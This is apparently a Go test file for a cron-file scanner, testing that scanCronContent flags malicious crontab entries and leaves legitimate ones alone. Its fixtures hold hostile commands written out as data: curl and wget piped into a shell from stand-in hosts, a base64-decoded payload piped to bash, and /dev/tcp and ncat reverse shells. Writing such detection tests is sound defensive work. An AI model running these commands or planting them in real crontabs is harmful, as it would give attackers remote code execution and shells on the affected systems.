package filewatch

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestScanCronContent(t *testing.T) {
	dir := t.TempDir()

	cases := []struct {
		name       string
		body       string
		wantReason string
	}{
		{
			name:       "kinsing-style curl pipe bash",
			body:       "* * * * * root curl -fsSL http://attacker.example/ldr.sh | bash\n",
			wantReason: "curl_pipe_shell",
		},
		{
			name:       "wget pipe sh",
			body:       "*/5 * * * * www-data wget -qO- http://x.example/m.sh | sh\n",
			wantReason: "wget_pipe_shell",
		},
		{
			name:       "base64 decode pipe shell",
			body:       "@reboot root echo CFRSWFNh | base64 -d | bash\n",
			wantReason: "base64_decode_pipe_shell",
		},
		{
			name:       "dev tcp reverse shell",
			body:       "* * * * * root bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n",
			wantReason: "dev_tcp_reverse_shell",
		},
		{
			name:       "exec from /tmp",
			body:       "*/2 * * * * root /tmp/.x/payload\n",
			wantReason: "exec_from_tmp",
		},
		{
			name:       "exec from /var/tmp",
			body:       "*/2 * * * * root /var/tmp/.system\n",
			wantReason: "exec_from_tmp",
		},
		{
			name:       "python reverse shell oneliner",
			body:       "* * * * * root python -c \"import socket;...\"\n",
			wantReason: "interpreter_reverse_shell",
		},
		{
			name:       "ncat exec",
			body:       "* * * * * root ncat --exec /bin/bash 1.2.3.4 4444\n",
			wantReason: "interpreter_reverse_shell",
		},

		// Negative cases — must NOT trigger.
		{
			name:       "legit curl to file (no shell pipe)",
			body:       "0 3 * * * root curl -fsSL https://example.com/data.tar.gz -o /var/cache/data.tar.gz\n",
			wantReason: "",
		},
		{
			name:       "legit wget for backup",
			body:       "0 4 * * * root /usr/local/bin/run-backup.sh && wget -q https://api.example.com/notify\n",
			wantReason: "",
		},
		{
			name:       "ordinary user crontab entry",
			body:       "*/15 * * * * /usr/local/bin/healthcheck\n",
			wantReason: "",
		},
		{
			name:       "empty file",
			body:       "",
			wantReason: "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			safe := strings.NewReplacer("/", "_", " ", "_").Replace(tc.name)
			p := filepath.Join(dir, "cron-"+safe)
			if err := os.WriteFile(p, []byte(tc.body), 0o644); err != nil {
				t.Fatal(err)
			}
			got := scanCronContent(p)
			if got.Reason != tc.wantReason {
				t.Errorf("scanCronContent(%q) reason = %q, want %q (snippet=%q)", tc.name, got.Reason, tc.wantReason, got.Snippet)
			}
		})
	}
}

func TestScanCronContent_MissingFile(t *testing.T) {
	got := scanCronContent("/nonexistent/path")
	if got.Reason != "" {
		t.Errorf("missing file should return empty result, got %+v", got)
	}
}

func TestSnippetTruncation(t *testing.T) {
	long := "* * * * * root curl http://x | bash " + repeat("A", 200)
	s := snippet(long, "curl")
	if len(s) > 120 {
		t.Errorf("snippet too long: %d chars", len(s))
	}
}

func repeat(s string, n int) string {
	out := make([]byte, n)
	for i := range out {
		out[i] = s[0]
	}
	return string(out)
}
